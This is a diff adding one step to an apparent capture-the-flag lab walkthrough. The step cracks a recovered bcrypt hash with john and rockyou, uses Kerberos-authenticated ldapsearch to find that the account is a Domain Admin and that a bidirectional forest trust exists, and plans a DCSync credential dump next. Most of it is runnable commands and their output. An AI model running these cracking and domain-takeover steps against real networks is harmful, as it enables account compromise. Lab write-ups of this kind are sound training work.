@@ -3802,6 +3802,102 @@ INSERT INTO `users` VALUES (3,'jerry.ap@dzcampaigns.htb','jerry','$2b$10$otSLTat
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 4.9 — Crack celia's hash and enumerate her privileges
+
+**Why this step:** A deleted user row was recovered from a root-readable backup. Determine whether the account corresponds to a domain principal and what privileges it holds.
+
+**Commands:**
+
+On the attacking host:
+
+```bash
+echo 'celia:$2b$10$2L.IKTOkBtwtWuKcAF/VJ.kUKiBHLQ8hPeg2KYJJXFOUdga2iLsoC' > celia.hash
+john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt celia.hash
+```
+
+On SRV01:
+
+```bash
+KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "DC=darkzero,DC=ext" "(sAMAccountName=celia)" \
+  dn sAMAccountName memberOf userAccountControl 2>&1 | grep -vE '^#|^$|^ref:|^search:|^result:'
+```
+
+```bash
+KRB5CCNAME=/tmp/krb5cc_gitea LDAPSASL_NOCANON=on ldapsearch -Y GSSAPI -H ldap://DC02.darkzero.ext \
+  -b "CN=System,DC=darkzero,DC=ext" "(objectClass=trustedDomain)" \
+  trustPartner trustDirection trustType trustAttributes 2>&1 | grep -iE 'trustPartner|trustDirection|trustType|trustAttributes'
+```
+
+**Breakdown:**
+
+|Component|Purpose|Simple Explanation|
+|---|---|---|
+|`LDAPSASL_NOCANON=on`|Disable SASL hostname canonicalisation for this invocation|Required as root — `~/.ldaprc` lives in `/home/svc-runner`|
+|`KRB5CCNAME=/tmp/krb5cc_gitea`|Use `svc-runner`'s ticket cache|Root holds no ticket of its own|
+|`memberOf`|Group memberships of the object|Which groups this user belongs to|
+|`userAccountControl`|Bit flags describing account state|Whether the account is enabled, expiring, locked|
+|`CN=System,DC=...`|Container holding trust objects|Where domain trusts are stored|
+|`(objectClass=trustedDomain)`|Filter for trust relationships|List domains this one trusts|
+
+**Result — crack:**
+
+```
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+babygurl13       (celia)
+1g 0:00:01:39 DONE (2026-07-29 07:50) 0.01007g/s 118.6p/s 118.6c/s 118.6C/s
+```
+
+**Result — celia's directory object:**
+
+```
+dn: CN=celia,CN=Users,DC=darkzero,DC=ext
+memberOf: CN=GiteaAdmins,CN=Users,DC=darkzero,DC=ext
+memberOf: CN=Domain Admins,CN=Users,DC=darkzero,DC=ext
+userAccountControl: 66048
+sAMAccountName: celia
+```
+
+**Result — trust enumeration:**
+
+```
+trustDirection: 3
+trustPartner: darkzero.htb
+trustType: 2
+trustAttributes: 8
+```
+
+**What this gives you:** Domain Administrator credentials for `darkzero.ext`, and discovery of a second forest.
+
+**Key findings:**
+
+- **Credentials recovered: `celia : babygurl13`.** Cracked in 99 seconds against rockyou.
+- **celia is a member of `Domain Admins` in `darkzero.ext`.** A row deleted from a web application's user table, recovered from a root-owned backup, yields full administrative control of the domain.
+- `userAccountControl: 66048` decodes to `NORMAL_ACCOUNT` (512) + `DONT_EXPIRE_PASSWORD` (65536). The account is enabled and its password never rotates, so the credential remains valid indefinitely.
+- celia also belongs to `GiteaAdmins`, granting administrative rights over the Gitea instance.
+- **A forest trust exists with `darkzero.htb`.** This is the second domain implied by the global catalog on port 3268 observed in 3.11.
+
+**Trust attribute decoding:**
+
+|Attribute|Value|Meaning|Simple Explanation|
+|---|---|---|---|
+|`trustPartner`|`darkzero.htb`|The trusted domain|The other forest|
+|`trustDirection`|3|`INBOUND` (1) + `OUTBOUND` (2) = bidirectional|Each forest trusts the other|
+|`trustType`|2|`TRUST_TYPE_UPLEVEL` — Windows 2000 or later domain|A modern Windows domain, not an MIT realm|
+|`trustAttributes`|8|`TRUST_ATTRIBUTE_FOREST_TRANSITIVE`|A forest trust, transitive across the whole forest|
+
+**Note on tooling:** Running as root required `LDAPSASL_NOCANON=on` explicitly. The `~/.ldaprc` created in 4.4 resides in `/home/svc-runner` and is not read by root, so an earlier query returned nothing when stderr was suppressed. Errors should not be discarded while diagnosing bind failures.
+
+**Next:** Authenticate as celia and dump domain credentials via DCSync, then examine the forest trust for a path into `darkzero.htb`.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
